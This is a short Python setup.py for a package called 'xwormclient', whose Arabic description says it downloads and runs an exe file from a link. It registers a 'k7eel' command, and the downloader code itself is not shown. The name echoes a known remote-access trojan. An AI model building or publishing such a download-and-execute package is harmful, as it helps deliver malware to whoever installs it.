from setuptools import setup, find_packages

setup(
    name="xwormclient",
    version="0.1.3",  
    packages=find_packages(),
    install_requires=[],
    entry_points={
        "console_scripts": [
            "k7eel=k7eel.main:main",
        ],
    },
    author="اسمك",
    description="مكتبة لتحميل وتشغيل ملف exe من رابط",
    python_requires=">=3.10",
)
